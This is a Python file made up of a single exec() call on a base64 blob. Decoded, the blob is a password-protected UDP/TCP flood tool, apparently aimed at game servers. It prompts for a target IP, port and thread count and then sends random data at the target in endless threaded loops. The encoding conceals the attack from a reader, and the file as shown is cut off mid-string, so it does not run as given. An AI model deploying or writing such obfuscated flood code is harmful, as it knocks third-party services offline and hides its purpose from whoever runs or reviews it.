import base64
exec(base64.b64decode(b'aW1wb3J0IHJhbmRvbQppbXBvcnQgc29ja2V0CmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHRpbWUKaW1wb3J0IG9zCmltcG9ydCBzeXMKZnJvbSB0aW1lIGltcG9ydCBzbGVlcAoKb3Muc3lzdGVtKCJjbGVhciIpCnBhc3N3b3JkID0iSmFzQWphIgoKZm9yIGkgaW4gcmFuZ2UoMyk6CiAgICBwd2QgPSBpbnB1dCgiWyAhIF0gUEFTU1dPUkQ6ICIpCiAgICBqPTMKICAgIGlmKHB3ZD09cGFzc3dvcmQpOgogICAgICAgIHRpbWUuc2xlZXAoNSkKICAgICAgICBwcmludCgiW8KVXSBUVU5HR1UgNSBERVRJSyEhISAiKQogICAgICAgIGJyZWFrCiAgICBlbHNlOgogICAgICAgIHRpbWUuc2xlZXAoNSkKICAgICAgICBwcmludCgiW8OXXSBQQVNTV09SRCBTQUxBSCEhISAiKQogICAgICAgIGNvbnRpbnVlCnRpbWUuc2xlZXAoNSkKcHJpbnQoInsafSBTZWxlc2FpIE1lbmdndW5ha2FuIFBhc3N3b3JkIikKcHJpbnQoInvigKJ9IERvbid0IEFidXNlIFRoaXMgVG9vbHMiKQoKcHJpbnQoIiIiCuKWkeKWkeKWkeKWkeKWkeKWiOKWiOKVl-KWkeKWiOKWiOKWiOKWiOKWiOKVl-KWkeKWkeKWiOKWiOKWiOKWiOKWiOKWiOKVl-KWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl-KWiOKWiOKWiOKWiOKWiOKWiOKVl-KWkeKWkeKWiOKWiOKWiOKWiOKWiOKVl-KWkQrilpHilpHilpHilpHilpHilojilojilZHilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilZDilZDilZ3ilZrilZDilZDilojilojilZTilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilojilojilZcK4paR4paR4paR4paR4paR4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWR4pWa4paI4paI4paI4paI4paI4pWX4paR4paR4paR4paR4paI4paI4pWR4paR4paR4paR4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWR4paR4paR4paI4paI4pWRCuKWiOKWiOKVl-KWkeKWkeKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWkeKVmuKVkOKVkOKVkOKWiOKWiOKVl-KWkeKWkeKWkeKWiOKWiOKVkeKWkeKWkeKWkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl-KWiOKWiOKVkeKWkeKWkeKWiOKWiOKVkQrilZrilojilojilojilojilojilZTilZ3ilojilojilZHilpHilpHilojilojilZHilojilojilojilojilojilojilZTilZ3ilpHilpHilpHilojilojilZHilpHilpHilpHilojilojilZHilpHilpHilojilojilZHilZrilojilojilojilojilojilZTilZ0K4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWd4paR4pWa4pWQ4pWd4paR4paR4pWa4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paR4paR4paR4paR4pWa4pWQ4pWd4paR4paR4paR4pWa4pWQ4pWd4paR4paR4pWa4pWQ4pWd4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWd4paRCnwgU0FNUCBUT09MUyB8fCBVRFAgfCIiIikKCgppcCA9IHN0cihpbnB1dCgiIElwIHRhcmdldCAgOiAiKSkKcG9ydCA9IGludChpbnB1dCgiIFBvcnQgVGFyZ2V0IDogIikpCmNob2ljZSA9IHN0cihpbnB1dCgiIE1ldGhvZHMgOiAiKSkKdGltZXMgPSBpbnQoaW5wdXQoIiBQYWtldCA6ICIpKQp0aHJlYWRzID0gaW50KGlucHV0KCIgVGhyZWFkcyA6ICIpKQoKZGVmIHVkcCgpOgogIGRhdGEgPSByYW5kb20uX3VyYW5kb20oMTE4MCkKICB3aGlsZSBUcnVlOgogICAgdHJ5OgogICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pCiAgICAgIGFkZHIgPSAoc3RyKGlwKSxpbnQocG9ydCkpCiAgICAgIGZvciB4IGluIHJhbmdlKHRpbWVzKToKICAgICAgICBzLnNlbmR0byhkYXRhLGFkZHIpCiAgICAgICAgcHJpbnQoZiJKYXN0cm8gQXR0YWNrIHtpcH0gcG9ydCB7cG9ydH0iKQogICAgZXhjZXB0OgogICAgICBwcmludChmIlhjIGNvbXVuaXR5IGF0dGFjayB7aXB9IHBvcnQge3BvcnR9IikKCmRlZiB0Y3AoKToKICBkYXRhID0gcmFuZG9tLl91cmFuZG9tKDEwMjQ5OCkKICB3aGlsZSBUcnVlOgogICAgdHJ5OgogICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICBzLmNvbm5lY3QoKGlwLHBvcnQpKQogICAgICBzLnNlbmQoZGF0YSkKICAgICAgZm9yIHggaW4gcmFuZ2UodGltZXMpOgogICAgICAgIHMuc2VuZChkYXRhKQogICAgICAgIHByaW50KGYiSmFzdHJvIEF0dGFjayB7aXB9IHBvcnQge3BvcnR9IikKICAgIGV4Y2VwdDoKICAgICBzLmNsb3NlKCkKICAgICBwcmludChmIkphc3RybyBhdHRhY2sge2lwfSBwb3J0IHtwb3J0fSIpCgpmb3IgeSBpbiByYW5nZSh0aHJlYWRzKToKICAgIGlmIGNob2ljZSA9PSAnVURQJzoKICAgICAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gdWRwKQogICAgICAgIHRoLnN0YXJ0KCkKICAgIGVsaWYgY2hvaWNlID09ICdUQ1AnOgogICAgICAgIHRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQgPSB0Y3ApCiAgICAgICAgdGguc3RhcnQoKQ